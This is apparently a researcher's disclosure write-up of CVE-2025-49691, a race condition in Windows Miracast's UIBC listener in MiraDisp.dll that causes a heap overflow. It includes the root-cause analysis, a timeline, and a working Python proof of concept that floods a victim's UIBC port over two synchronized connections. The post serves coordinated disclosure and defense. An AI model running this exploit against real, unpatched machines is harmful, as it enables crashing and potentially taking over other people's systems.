---
layout: post
title: "Mirage (CVE-2025-49691): Remote Code Execution Vulnerability in Miracast on Windows"
author: Marin Duroyon
---

Casting your screen could let an attacker remotely take over your Windows machine!

![WIN+K](/assets/Miracast_Win_K_mirage.gif)

CVE links:

  * Microsoft Advisory: [CVE-2025-49691](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-49691)
  * CVE.org link: [CVE-2025-49691](https://www.cve.org/CVERecord?id=CVE-2025-49691)

### 1. Summary

This report presents an important race condition vulnerability in the Windows implementation of the User Input Back Channel protocol for Miracast. The vulnerability is exploitable by an unauthenticated attacker on the same network during the connection to a Miracast display.

Successful exploitation of the race condition leads to a heap-based buffer overflow. This memory corruption can be exploited to achieve Remote Code Execution (RCE) on the victim's machine, enabling an attacker to take control of the system.

### 2. Technology and Vulnerability Context

#### 2.1 Miracast and UIBC

**Miracast** is a standard protocol that allows Windows devices (the *source*) to wirelessly mirror their screen to a compatible display (the *sink*), such as a smart TV or wireless projector. The protocol is defined in Microsoft's specification [[MS-MICE]](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mice/9598ca72-d937-466c-95f6-70401bb10bdb).

The **User Input Back Channel (UIBC)** is an optional component of Miracast. It allows the sink (e.g., a touchscreen display) to send user input—such as mouse, keyboard, or touch commands—back to the source device (e.g., Windows laptop). This enables a user to control their laptop directly from the connected display. This vulnerability lies specifically within the Windows component responsible for receiving and parsing these UIBC packets.

#### 2.2 Attack Scenario

The primary attack vector requires the attacker to be on the same local network as the victim.

Scenario:

1.  **Malicious Sink:** The attacker operates a malicious Miracast sink, making it appear as a legitimate wireless display.
2.  **User Interaction:** The user initiates a connection by pressing `WIN+K` and selects the attacker's malicious device from the list of available displays.
3.  **Exploitation:** Upon connection, the victim's Windows machine opens a port to receive UIBC packets. The attacker's sink immediately sends a precisely timed sequence of large data packets across two concurrent threads.
4.  **Outcome:** This action exploits the race condition in the UIBC parsing logic, triggering a heap buffer overflow that can lead to a full system compromise.

![WIN+K](/assets/Miracast_Win_K_mirage.gif)

Moreover, when a Windows computer connects to any legitimate Miracast device and negotiates a UIBC session, it opens a TCP port (typically `50000`) to listen for UIBC data. This creates a window of opportunity for an attacker on the same network to:

1. Discover the victim's open UIBC port through network scanning.
2. Directly connect to this port and send the malicious payload, triggering the heap overflow without ever acting as the Miracast sink.

This alternative scenario, widens the attack surface, as it removes the requirement for the user to connect to an attacker-controlled device.

## 3. Vulnerability Details

* **Affected Products:** Windows 10 and 11 as well as Windows Server 2016 to 2025
* **Tested On:** Windows 11 Laptop
* **Windows DLL:** MiraDisp.dll
* **Affected Version:** from 10.0.17763.0 before 10.0.17763.7558 
* **Vulnerability Type:** CWE-122: Heap-based Buffer Overflow
* **CVSS v3.1 Score:** 8.0 High
* **CVSS Vector:** CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C

## 4. Technical Description

### 4.1 Root Cause

The root cause is a race condition vulnerability in the `CUibcNetworkListener` class within `MiraDisp.dll`. The flaw stems from the improper synchronization of a shared data buffer (`this->packet`) and its corresponding size counter (`this->packet_size`), which are not protected against concurrent access from multiple, simultaneous UIBC connections.

#### Shared State and Key Methods

The `CUibcNetworkListener` class manages incoming data using a single shared state for all connections:

  * **Shared Buffer (`this->packet`):** A buffer of size `0xFFFF` (65,535 bytes) allocated to receive all incoming UIBC data.
  * **Size Counter (`this->packet_size`):** A member variable that tracks the amount of data currently stored in the shared buffer.
  * **Callback Methods:**
      * `CUibcNetworkListener::OnAccept`: Handles new incoming connections.
      * `CUibcNetworkListener::OnReceive`: Processes data received from an existing connection.

#### Normal Operation (Single Connection)

With a single connection, the logic functions as intended in a sequential loop:

1.  **Connection:** `OnAccept` is called for a new connection. It initiates the first asynchronous read by calling `CSocket::BeginReceive`, instructing it to write up to `0xFFFF` bytes at the **start** of the shared buffer (`this->packet`).
2.  **Data Reception:** `OnReceive` is called when data arrives. It updates `this->packet_size` with the number of bytes received.
3.  **Next Read:** It then calls `CSocket::BeginReceive` again to wait for more data. Critically, it provides an updated offset and size, telling the socket to write at the next available position (`this->packet + this->packet_size`) and to only read up to the remaining buffer space (`0xFFFF - this->packet_size`).

```cpp
// In OnReceive, the next read correctly accounts for data already in the buffer.
long result = CSocket::BeginReceive(
    this->socket,
    this->packet + this->packet_size, // Arg2: Offset to the next empty spot
    0xFFFF - this->packet_size,       // Arg3: Remaining available space
    this->callback_ptr,
    NULL
);
```

#### The Race Condition (Multiple Connections)

The vulnerability is triggered when a second connection interrupts the normal receive loop of the first connection.

1.  **Connection 1 Receives Data:** The first connection is active, and data has been received. The `this->packet_size` variable is now greater than zero.

2.  **Crucial Interruption:** Before `OnReceive` for Connection 1 can call `BeginReceive` for its *next* data chunk, **Connection 2 is established**, and its `OnAccept` method is executed.

3.  **The Flaw:** The `OnAccept` method for Connection 2 is not aware of the existing data from Connection 1. It calls `CSocket::BeginReceive` and, following its standard logic, instructs its socket to write data at the **very beginning** of the shared buffer (`this->packet`) with a maximum size of `0xFFFF`.

    ```cpp
    // The new connection's OnAccept call resets the write position to the start of the buffer,
    // ignoring the data already present from the first connection.
    long result = CSocket::BeginReceive(
        this->socket,
        this->packet,       // Arg2: Points to the start of the listener's buffer
        0xFFFF,             // Arg3: Max size is reset to the full buffer size
        this->callback_ptr,
        NULL
    );
    ```

4.  **The Overflow:** Now, data arrives from either connection and `OnReceive` is called. It calculates the new buffer size based on the (now stale) `this->packet_size` from Connection 1 and the newly received bytes. Because Connection 2's data may have overwritten the start of the buffer, the calculation `new_packet_size = recv_buf_len + this->packet_size` can now easily exceed the `0xFFFF` limit.

5.  **The Crash:** The subsequent `memmove` operation uses this incorrect, oversized `new_packet_size`, writing past the bounds of `this->packet` and causing a heap-based buffer overflow.

    ```cpp
    // The calculated new_packet_size can exceed 0xFFFF, causing memmove to write out of bounds.
    new_packet_size = recv_buf_len + this->packet_size;
    memmove(_Dst: this->packet, _Src: packet, _Size: new_packet_size); // Heap overflow occurs here
    ```

### 4.2 Discovery Methodology

The discovery was made using a custom-built, protocol-aware fuzzer targeting the Windows Miracast stack. The fuzzer was instrumented to create and identify race conditions within the UIBC protocol parser. This process successfully triggered the vulnerability: a race condition during packet parsing that results in a heap-based buffer overflow (CVE-2025-49691).

### 4.3 Proof of Concept (PoC)

The following Python script provides a working PoC that reliably triggers the race condition in `CUibcNetworkListener`, leading to a heap-based buffer overflow.

#### 4.3.1 PoC Mechanism

The script's objective is to replicate the exact timing scenario described in the root cause analysis. It uses two concurrent threads and `threading.Barrier` objects for precise synchronization to achieve this.

The PoC works by orchestrating the following sequence:

1.  **Simultaneous Connection:** Two threads establish separate TCP connections to the target's UIBC port. The `TCP_NODELAY` socket option is enabled to ensure data is sent immediately, without network buffering delays.
2.  **Controlled Sending Sequence:** Using barriers for synchronization, **Thread 0** sends a `0xFFFE`-byte packet. Immediately upon completion of that send operation, **Thread 1** is released and sends an identical `0xFFFE`-byte packet.
3.  **Triggering the Overflow:** This rapid, back-to-back delivery of large packets from two distinct connections exploits the race condition. The total data sent (`0x1FFFC` bytes) overwhelms the shared buffer's `0xFFFF` capacity, causing a heap overflow when the `memmove` operation is called inside the `OnReceive` method.

#### 4.3.2 PoC Implementation

The code below implements the logic described. The comments explain how each part of the script maps to the steps of the exploit.

> **Note**: For reliable crash detection, enable [PageHeap](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap) on the target process

```python
import threading
import socket
import time

# --- Configuration ---
WORKERS = 2                 # Must be 2 to trigger this specific race condition

# --- Synchronization Primitives ---
# A barrier to ensure both threads have connected before sending any data.
connect_barrier = threading.Barrier(WORKERS)
# The main barrier used to trigger the race condition.
race_trigger_barrier = threading.Barrier(WORKERS)

def trigger_race_condition(thread_id):
    """
    This function is executed by each thread. It connects to the target
    and uses barriers to create the precise packet timing needed for the exploit.
    """
    try:
        # 1. Create and connect the socket.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Ensure data is sent immediately without delay.
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect((TARGET_IP, TARGET_PORT))

        # Wait here until both threads are successfully connected.
        connect_barrier.wait()

        # 2. Prepare the payload: 65,534 bytes of 'A's.
        payload = b"A" * 0xFFFE

        # --- Core Race Condition Logic ---
        if thread_id == 0:
            # 3. Thread 0 sends its data first.
            sock.send(payload)
            # It then waits at the barrier, which will release Thread 1 to run.
            race_trigger_barrier.wait()
        else: # This is Thread 1
            # 4. Thread 1 waits here until Thread 0 has finished sending.
            race_trigger_barrier.wait()
            # Immediately after being released, Thread 1 sends its payload.
            # This causes the two packets to arrive almost simultaneously at the server.
            sock.send(payload)

    except Exception as e:
        print(f"[Thread {thread_id}] An error occurred: {e}")
    finally:
        # 5. Cleanly close the connection.
        sock.close()

if __name__ == "__main__":
    threads = []
    for i in range(WORKERS):
        thread = threading.Thread(target=trigger_race_condition, args=(i,))
        threads.append(thread)
        thread.start()

    # Wait for both threads to complete their execution.
    for thread in threads:
        thread.join()
```

### 4.4 Impact

Microsoft has assigned this vulnerability a severity rating of **Important** with a security impact of **Remote Code Execution**. With sufficient investigation, the heap overflow could be exploited and lead to executing code remotely on a Windows machine.

## 5\. Disclosure Timeline

 * **2025-04-08:** Vulnerability reported to Microsoft.
 * **2025-05-12:** Microsoft confirmed the vulnerability and began working on a patch.
 * **2025-06-11:** Vulnerabilty has been fixed. Release planned for Microsoft's July 2025 Security Update Release.
 * **2025-07-08:** Coordinated public disclosure of the vulnerability.

## 6\. Credit

This vulnerability was discovered and reported by me, Marin Duroyon.
The findings and opinions expressed in this report are my own and were conducted on my personal time, independent of my employer.
